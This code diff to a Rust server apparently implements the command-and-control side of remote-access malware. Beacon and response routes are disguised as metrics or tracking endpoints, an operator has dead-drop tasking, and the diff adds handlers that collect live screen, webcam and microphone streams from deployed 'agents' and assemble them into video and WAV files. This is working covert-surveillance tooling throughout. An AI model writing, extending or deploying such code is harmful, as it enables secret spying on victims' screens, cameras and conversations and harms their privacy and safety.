@@ -70,6 +70,20 @@ struct AppState {
     persist_tx: tokio::sync::mpsc::UnboundedSender<PersistEvent>,
 }
 
+/// Scratch buffer for live stream chunks uploaded by the agent. Each chunk
+/// is a binary blob (the payload after the 8-byte seq/flags header). When
+/// `finalized` is true the final chunk has been received and the stream
+/// can be assembled into a file on disk.
+#[derive(Clone, Default, serde::Deserialize, serde::Serialize)]
+struct StreamBuffer {
+    chunks: Vec<Vec<u8>>,
+    finalized: bool,
+    /// Command that produced this buffer (stream_display / stream_camera /
+    /// stream_mic / record_*). Used to decide video vs audio assembly and
+    /// to serve the live-poll endpoint.
+    stream_type: Option<String>,
+}
+
 #[derive(Clone, Default, serde::Deserialize, serde::Serialize)]
 struct Store {
     #[serde(default)]
@@ -82,6 +96,10 @@ struct Store {
     responses: HashMap<String, Vec<AgentResponse>>,
     #[serde(default)]
     payloads: HashMap<String, PayloadArtifact>,
+    /// In-memory scratch buffers for live stream chunk uploads.
+    /// Key format: `{agent_id}|{task_id}`.
+    #[serde(default)]
+    stream_buffers: HashMap<String, StreamBuffer>,
 }
 
 type SharedState = Arc<Mutex<AppState>>;
@@ -187,6 +205,18 @@ async fn main() {
         .route("/api/v2/metrics", post(handle_beacon))
         .route("/track", post(handle_beacon))
         .route("/metrics/v1/events", post(handle_response))
+        // Live stream chunk upload endpoint. The agent posts chunks here
+        // while a stream_display / stream_camera / stream_mic task is active.
+        .route(
+            "/api/upload/stream/:agent_id/:task_id",
+            post(handle_stream_upload),
+        )
+        // Live stream poll endpoint. Returns the most recent frame (video) or
+        // accumulated audio (mic) for an in-progress stream.
+        .route(
+            "/api/stream/:agent_id/:task_id",
+            get(handle_stream_live),
+        )
         // B11: dead-drop tasking. Operator can `POST /api/dead_drop/<id>/push`
         // to enqueue, and the agent polls `GET /dead_drop/<id>`.
         .route("/dead_drop/:agent_id", get(handle_dead_drop_get))
@@ -939,6 +969,148 @@ async fn handle_dead_drop_push(
     Ok(Json(record))
 }
 
+/// Receive a single live-stream chunk from an agent. The binary body is:
+///   [4-byte BE seq_num][4-byte BE flags][payload]
+/// where flags & 1 == 1 indicates the final chunk. Chunks are stored in
+/// the in-memory `stream_buffers` map on the Store and assembled into a
+/// file when the stream task completes.
+async fn handle_stream_upload(
+    State(api): State<ApiState>,
+    headers: HeaderMap,
+    AxumPath((agent_id, task_id)): AxumPath<(String, String)>,
+    body: axum::body::Bytes,
+) -> Result<(StatusCode, String), (StatusCode, String)> {
+    require_agent_auth(&headers, &api.shared, &api.auth, &agent_id).await?;
+
+    if body.len() < 8 {
+        return Err((StatusCode::BAD_REQUEST, "chunk too short".into()));
+    }
+
+    let flags = u32::from_be_bytes([body[4], body[5], body[6], body[7]]);
+    let payload = body.slice(8..);
+
+    let key = format!("{}|{}", agent_id, task_id);
+    // Look up the producing command outside the mutable buffer borrow.
+    let cmd = {
+        let s = api.shared.lock().await;
+        s.store.tasks.get(&task_id).map(|t| t.task.command.clone())
+    };
+    {
+        let mut s = api.shared.lock().await;
+        let buf = s.store.stream_buffers.entry(key).or_default();
+        buf.chunks.push(payload.to_vec());
+        if flags & 1 != 0 {
+            buf.finalized = true;
+        }
+        // Stamp the buffer with the producing command so the live-poll
+        // endpoint and assembly know whether this is video or audio.
+        if buf.stream_type.is_none() {
+            if let Some(c) = cmd {
+                buf.stream_type = Some(c);
+            }
+        }
+    }
+
+    Ok((StatusCode::OK, "ok".into()))
+}
+
+/// Live-poll endpoint for an in-progress stream. Returns the most recent
+/// video frame as `image/jpeg`, or the accumulated audio as `audio/wav`.
+/// Used by the operator UI to show a live view while the agent captures.
+async fn handle_stream_live(
+    State(api): State<ApiState>,
+    headers: HeaderMap,
+    AxumPath((agent_id, task_id)): AxumPath<(String, String)>,
+) -> Result<axum::response::Response, (StatusCode, String)> {
+    require_api_auth(&headers, &api.shared, &api.auth).await?;
+
+    let key = format!("{}|{}", agent_id, task_id);
+    let buf = {
+        let s = api.shared.lock().await;
+        s.store.stream_buffers.get(&key).cloned()
+    };
+    let buf = buf.ok_or((StatusCode::NOT_FOUND, "no active stream buffer".into()))?;
+
+    let is_video = matches!(
+        buf.stream_type.as_deref(),
+        Some("stream_display") | Some("stream_camera") | Some("record_display") | Some("record_camera")
+    );
+
+    if is_video {
+        // Extract the most recent frame from the last uploaded chunk.
+        let last_chunk = buf.chunks.last().cloned().unwrap_or_default();
+        let mut off = if last_chunk.len() >= 16 && &last_chunk[0..4] == b"MJPF" { 16usize } else { 0usize };
+        let mut last_frame: Vec<u8> = Vec::new();
+        while off + 4 <= last_chunk.len() {
+            let sz = u32::from_be_bytes([
+                last_chunk[off], last_chunk[off + 1], last_chunk[off + 2], last_chunk[off + 3],
+            ]) as usize;
+            off += 4;
+            if off + sz > last_chunk.len() {
+                break;
+            }
+            last_frame = last_chunk[off..off + sz].to_vec();
+            off += sz;
+        }
+        if last_frame.is_empty() {
+            return Err((StatusCode::NOT_FOUND, "no frames captured yet".into()));
+        }
+        return Ok(axum::response::Response::builder()
+            .header("content-type", "image/jpeg")
+            .header("cache-control", "no-store")
+            .body(axum::body::Body::from(last_frame))
+            .unwrap());
+    }
+
+    // Audio: rebuild a WAV from all accumulated PCM chunks.
+    let meta = {
+        let s = api.shared.lock().await;
+        s.store
+            .responses
+            .get(&agent_id)
+            .and_then(|rs| rs.iter().find(|r| r.task_id.as_deref() == Some(task_id.as_str())))
+            .and_then(|r| serde_json::from_str::<serde_json::Value>(&r.output).ok())
+            .unwrap_or(serde_json::Value::Null)
+    };
+    let sample_rate = meta.get("sample_rate").and_then(|v| v.as_u64()).unwrap_or(44100) as u32;
+    let channels = meta.get("channels").and_then(|v| v.as_u64()).unwrap_or(2) as u16;
+    let bits = meta.get("bits_per_sample").and_then(|v| v.as_u64()).unwrap_or(16) as u16;
+    let block_align = channels * (bits / 8);
+    let byte_rate = sample_rate * block_align as u32;
+
+    let mut pcm: Vec<u8> = Vec::new();
+    for chunk in &buf.chunks {
+        if chunk.len() < 8 {
+            continue;
+        }
+        let sz = u32::from_le_bytes([chunk[4], chunk[5], chunk[6], chunk[7]]) as usize;
+        let avail = chunk.len().saturating_sub(8);
+        let copy = std::cmp::min(sz, avail);
+        pcm.extend_from_slice(&chunk[8..8 + copy]);
+    }
+    let data_size = pcm.len() as u32;
+    let mut wav: Vec<u8> = Vec::new();
+    wav.extend_from_slice(b"RIFF");
+    wav.extend_from_slice(&(36 + data_size).to_le_bytes());
+    wav.extend_from_slice(b"WAVE");
+    wav.extend_from_slice(b"fmt ");
+    wav.extend_from_slice(&16u32.to_le_bytes());
+    wav.extend_from_slice(&1u16.to_le_bytes());
+    wav.extend_from_slice(&channels.to_le_bytes());
+    wav.extend_from_slice(&byte_rate.to_le_bytes());
+    wav.extend_from_slice(&(block_align as u32).to_le_bytes());
+    wav.extend_from_slice(&bits.to_le_bytes());
+    wav.extend_from_slice(b"data");
+    wav.extend_from_slice(&data_size.to_le_bytes());
+    wav.extend_from_slice(&pcm);
+
+    Ok(axum::response::Response::builder()
+        .header("content-type", "audio/wav")
+        .header("cache-control", "no-store")
+        .body(axum::body::Body::from(wav))
+        .unwrap())
+}
+
 async fn handle_response(
     State(api): State<ApiState>,
     headers: HeaderMap,
@@ -963,12 +1135,15 @@ async fn handle_response(
     {
         let mut s = api.shared.lock().await;
         let now = unix_now();
-        if let Some(task_id) = payload.task_id.clone() {
-            let task_command = s
-                .store
-                .tasks
-                .get(&task_id)
-                .map(|task| task.task.command.clone());
+            if let Some(task_id) = payload.task_id.clone() {
+                let task_command = s
+                    .store
+                    .tasks
+                    .get(&task_id)
+                    .map(|task| task.task.command.clone());
+                // When true, the response is a "stream_started" ack and we must
+                // NOT complete the task (the capture loop is still running).
+                let mut keep_task_running = false;
             if task_command.as_deref() == Some("file_download")
                 && payload.status == "success"
             {
@@ -995,22 +1170,146 @@ async fn handle_response(
                     payload.output = format!("screenshot storage failed: {}", err);
                 }
             }
-            if let Some(task) = s.store.tasks.get_mut(&task_id) {
-                task.completed_at_unix = Some(now);
-                task.status = if payload.status == "success" {
-                    TaskStatus::Completed
-                } else {
-                    TaskStatus::Failed
-                };
-            }
-            let _ = s.persist_tx.send(PersistEvent::TaskCompleted {
-                task_id,
-                status: serde_json::to_value(&s.store.tasks.get(&payload.task_id.clone().unwrap_or_default()).map(|t| t.status.clone()).unwrap_or(TaskStatus::Failed))
+            // Record commands upload chunks while capturing (same transport
+            // as live streams). Assemble the accumulated buffer on completion.
+            if matches!(task_command.as_deref(),
+                Some("record_display") | Some("record_camera") | Some("record_mic"))
+                && payload.status == "success"
+            {
+                let is_started = serde_json::from_str::<serde_json::Value>(&payload.output)
                     .ok()
-                    .and_then(|v| v.as_str().map(|s| s.to_owned()))
-                    .unwrap_or_else(|| "failed".to_owned()),
-                completed_at_unix: now,
-            });
+                    .and_then(|v| v.get("type").and_then(|t| t.as_str().map(|s| s == "record_started")))
+                    .unwrap_or(false);
+                if !is_started {
+                    let dd = s.config.download_dir.clone();
+                    if let Err(err) = assemble_stream_from_buffer(
+                        &dd,
+                        &agent_id,
+                        &task_id,
+                        &mut payload,
+                        &mut s.store.stream_buffers,
+                    ) {
+                        payload.status = "error".to_owned();
+                        payload.output = format!("record assembly failed: {}", err);
+                    }
+                } else {
+                    keep_task_running = true;
+                }
+            }
+            // Live stream commands upload chunks via /api/upload/stream while
+            // they run. There are two response shapes:
+            //   * type == "stream_started"  -> the agent just acked and the
+            //     capture loop is running in a background thread. Do NOT
+            //     assemble; keep the buffer alive for the live-poll endpoint
+            //     and leave the task in the Dispatched (running) state.
+            //   * type == "stream_display" (etc.) -> natural end of capture;
+            //     assemble the buffer into a final file and complete the task.
+            if matches!(task_command.as_deref(),
+                Some("stream_display") | Some("stream_camera") | Some("stream_mic"))
+                && payload.status == "success"
+            {
+                let is_started = serde_json::from_str::<serde_json::Value>(&payload.output)
+                    .ok()
+                    .and_then(|v| v.get("type").and_then(|t| t.as_str().map(|s| s == "stream_started")))
+                    .unwrap_or(false);
+                if !is_started {
+                    let dd = s.config.download_dir.clone();
+                    if let Err(err) = assemble_stream_from_buffer(
+                        &dd,
+                        &agent_id,
+                        &task_id,
+                        &mut payload,
+                        &mut s.store.stream_buffers,
+                    ) {
+                        payload.status = "error".to_owned();
+                        payload.output = format!("stream assembly failed: {}", err);
+                    }
+                } else {
+                    keep_task_running = true;
+                }
+            }
+            // stream_stop: the operator asked the agent to end a live stream.
+            // Assemble every active stream buffer for this agent into its
+            // final file and mark the stream tasks completed.
+            if task_command.as_deref() == Some("stream_stop") {
+                let agent_key = format!("{}|", agent_id);
+                let keys: Vec<String> = s
+                    .store
+                    .stream_buffers
+                    .keys()
+                    .filter(|k| {
+                        if !k.starts_with(&agent_key) {
+                            return false;
+                        }
+                        let Some((_, tid)) = k.split_once('|') else { return false; };
+                        s.store.tasks.get(tid).map(|t| {
+                            t.agent_id == agent_id
+                                && t.status == TaskStatus::Dispatched
+                                && matches!(t.task.command.as_str(),
+                                    "stream_display" | "stream_camera" | "stream_mic")
+                        }).unwrap_or(false)
+                    })
+                    .cloned()
+                    .collect();
+                let dd = s.config.download_dir.clone();
+                for key in keys {
+                    let Some((_, tid)) = key.split_once('|') else { continue };
+                    // Clone the response to update (immutable borrow, dropped
+                    // before we re-borrow `s.store` mutably for assembly).
+                    let mut response = s
+                        .store
+                        .responses
+                        .get(&agent_id)
+                        .and_then(|resp| {
+                            resp.iter()
+                                .find(|r| r.task_id.as_deref() == Some(tid))
+                                .cloned()
+                        })
+                        .unwrap_or_else(|| AgentResponse {
+                            agent_id: agent_id.clone(),
+                            task_id: Some(tid.to_owned()),
+                            output: "{}".to_owned(),
+                            status: "success".to_owned(),
+                        });
+                    let _ = assemble_stream_from_buffer(
+                        &dd, &agent_id, tid, &mut response, &mut s.store.stream_buffers);
+                    // Write the assembled response back.
+                    if let Some(resp) = s.store.responses.get_mut(&agent_id) {
+                        if let Some(r) = resp.iter_mut().find(|r| r.task_id.as_deref() == Some(tid)) {
+                            *r = response;
+                        }
+                    }
+                }
+                // Mark all stream_* tasks for this agent as completed.
+                for task in s.store.tasks.values_mut() {
+                    if task.agent_id == agent_id
+                        && task.status == TaskStatus::Dispatched
+                        && matches!(task.task.command.as_str(),
+                            "stream_display" | "stream_camera" | "stream_mic")
+                    {
+                        task.status = TaskStatus::Completed;
+                        task.completed_at_unix = Some(now);
+                    }
+                }
+            }
+            if !keep_task_running {
+                if let Some(task) = s.store.tasks.get_mut(&task_id) {
+                    task.completed_at_unix = Some(now);
+                    task.status = if payload.status == "success" {
+                        TaskStatus::Completed
+                    } else {
+                        TaskStatus::Failed
+                    };
+                }
+                let _ = s.persist_tx.send(PersistEvent::TaskCompleted {
+                    task_id,
+                    status: serde_json::to_value(&s.store.tasks.get(&payload.task_id.clone().unwrap_or_default()).map(|t| t.status.clone()).unwrap_or(TaskStatus::Failed))
+                        .ok()
+                        .and_then(|v| v.as_str().map(|s| s.to_owned()))
+                        .unwrap_or_else(|| "failed".to_owned()),
+                    completed_at_unix: now,
+                });
+            }
         }
         s.store
             .responses
@@ -1115,6 +1414,167 @@ fn store_screenshot_file(
         "size": bytes.len()
     })
     .to_string();
+    Ok(())
+}
+
+/// Assemble an accumulated stream buffer into a file on disk and replace
+/// `payload.output` with metadata. Called when a live stream task completes.
+///
+/// For display/camera streams the buffer contains frames with 4-byte BE size
+/// prefixes (same payload as the record_* commands use). We wrap them in a
+/// MJPF container so the frontend can parse it the same way.
+/// For mic streams each chunk starts with `MIC ` tag + 4-byte LE PCM size;
+/// we build a proper WAV header from the task metadata and append the PCM.
+fn assemble_stream_from_buffer(
+    download_dir: &Path,
+    agent_id: &str,
+    task_id: &str,
+    payload: &mut AgentResponse,
+    buffers: &mut HashMap<String, StreamBuffer>,
+) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
+    let key = format!("{}|{}", agent_id, task_id);
+    let buf = buffers.remove(&key).unwrap_or_default();
+
+    // Guard against double-assembly: if the buffer was already consumed (e.g.
+    // stream_stop assembled it first), leave the existing payload untouched
+    // rather than writing an empty file over the good artifact.
+    if buf.chunks.is_empty() {
+        return Ok(());
+    }
+
+    let meta: serde_json::Value = serde_json::from_str(&payload.output)
+        .unwrap_or(serde_json::Value::Null);
+    let stream_type: String = buf
+        .stream_type
+        .clone()
+        .or_else(|| meta.get("type").and_then(|v| v.as_str()).map(|s| s.to_owned()))
+        .unwrap_or_else(|| "stream_display".to_owned());
+
+    let safe_agent_id = safe_path_segment(agent_id);
+    let safe_task_id = safe_path_segment(task_id);
+    let artifact_dir = download_dir.join(&safe_agent_id).join(&safe_task_id);
+    std::fs::create_dir_all(&artifact_dir)?;
+
+    let is_video = matches!(
+        stream_type.as_str(),
+        "stream_display" | "stream_camera" | "record_display" | "record_camera"
+    );
+
+    if is_video {
+        let width = meta.get("width").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+        let height = meta.get("height").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+
+        let mut frames: Vec<Vec<u8>> = Vec::new();
+        for chunk in &buf.chunks {
+            let mut off = if chunk.len() >= 16 && &chunk[0..4] == b"MJPF" { 16usize } else { 0usize };
+            while off + 4 <= chunk.len() {
+                let sz = u32::from_be_bytes([
+                    chunk[off], chunk[off+1], chunk[off+2], chunk[off+3],
+                ]) as usize;
+                off += 4;
+                if off + sz > chunk.len() { break; }
+                frames.push(chunk[off..off+sz].to_vec());
+                off += sz;
+            }
+        }
+
+        let filename = match stream_type.as_str() {
+            "stream_display" => "stream_display.mjpeg",
+            "stream_camera"  => "stream_camera.mjpeg",
+            _ => "stream.mjpeg",
+        };
+        let path = artifact_dir.join(filename);
+        let mut writer = std::fs::File::create(&path)?;
+        {
+            use std::io::Write;
+            writer.write_all(b"MJPF")?;
+            writer.write_all(&(frames.len() as u32).to_be_bytes())?;
+            writer.write_all(&width.to_be_bytes())?;
+            writer.write_all(&height.to_be_bytes())?;
+            for frame in &frames {
+                writer.write_all(&(frame.len() as u32).to_be_bytes())?;
+                writer.write_all(frame)?;
+            }
+            writer.flush()?;
+        }
+
+        // Total file size = 16-byte header + (4+frame_size) per frame
+        let total_size: u64 = 16 + frames.iter().map(|f| 4u64 + f.len() as u64).sum::<u64>();
+        payload.output = serde_json::json!({
+            "type": stream_type,
+            "saved_path": path.display().to_string(),
+            "width": width,
+            "height": height,
+            "frame_count": frames.len(),
+            "size": total_size,
+            "chunks_accumulated": buf.chunks.len(),
+            "duration_s": meta.get("duration_s").and_then(|v| v.as_u64()).unwrap_or(0),
+            "fps": meta.get("fps").and_then(|v| v.as_u64()).unwrap_or(0),
+            "elapsed_ms": meta.get("elapsed_ms").and_then(|v| v.as_u64()).unwrap_or(0),
+            "quality": meta.get("quality").and_then(|v| v.as_u64()).unwrap_or(0),
+        }).to_string();
+    } else {
+        // Mic stream: each chunk payload is [MIC ][LE_size][PCM...].
+        // Build a WAV header and append all PCM data.
+        let sample_rate  = meta.get("sample_rate").and_then(|v| v.as_u64()).unwrap_or(44100) as u32;
+        let channels     = meta.get("channels").and_then(|v| v.as_u64()).unwrap_or(2) as u16;
+        let bits_per_smp = meta.get("bits_per_sample").and_then(|v| v.as_u64()).unwrap_or(16) as u16;
+        let block_align  = channels * (bits_per_smp / 8);
+        let byte_rate    = sample_rate as u32 * block_align as u32;
+
+        // Extract all PCM pieces from the chunks (skip 8-byte MIC tag).
+        let mut pcm = Vec::<u8>::new();
+        for chunk in &buf.chunks {
+            if chunk.len() < 8 { continue; }
+            // chunk[0..4] = "MIC ", chunk[4..8] = LE32 size
+            let payload_size = u32::from_le_bytes([
+                chunk[4], chunk[5], chunk[6], chunk[7],
+            ]) as usize;
+            let avail = chunk.len().saturating_sub(8);
+            let copy = std::cmp::min(payload_size, avail);
+            pcm.extend_from_slice(&chunk[8..8+copy]);
+        }
+
+        // Build RIFF WAV header.
+        let data_size = pcm.len() as u32;
+        fn le16(v: u16) -> [u8; 2] { v.to_le_bytes() }
+        fn le32(v: u32) -> [u8; 4] { v.to_le_bytes() }
+
+        let mut wav = Vec::<u8>::new();
+        wav.extend_from_slice(b"RIFF");
+        wav.extend_from_slice(&le32(36 + data_size));
+        wav.extend_from_slice(b"WAVE");
+        wav.extend_from_slice(b"fmt ");
+        wav.extend_from_slice(&le32(16));
+        wav.extend_from_slice(&le16(1));            // PCM
+        wav.extend_from_slice(&le16(channels));
+        wav.extend_from_slice(&le32(byte_rate));
+        wav.extend_from_slice(&le32(block_align as u32));
+        wav.extend_from_slice(&le16(bits_per_smp));
+        wav.extend_from_slice(b"data");
+        wav.extend_from_slice(&le32(data_size));
+        wav.extend_from_slice(&pcm);
+
+        let filename = "stream_mic.wav";
+        let path = artifact_dir.join(filename);
+        let mut writer = std::fs::File::create(&path)?;
+        {
+            use std::io::Write;
+            writer.write_all(&wav)?;
+            writer.flush()?;
+        }
+
+        payload.output = serde_json::json!({
+            "type": stream_type,
+            "saved_path": path.display().to_string(),
+            "sample_rate": sample_rate,
+            "channels": channels,
+            "bits_per_sample": bits_per_smp,
+            "size": wav.len(),
+            "chunks_accumulated": buf.chunks.len(),
+        }).to_string();
+    }
+
     Ok(())
 }
 
@@ -2028,6 +2488,8 @@ async fn api_get_artifact(
         Some("jpg") | Some("jpeg") => "image/jpeg",
         Some("gif") => "image/gif",
         Some("webp") => "image/webp",
+        Some("mjpeg") => "application/octet-stream",
+        Some("wav") => "audio/wav",
         Some("pdf") => "application/pdf",
         Some("zip") => "application/zip",
         _ => "application/octet-stream",
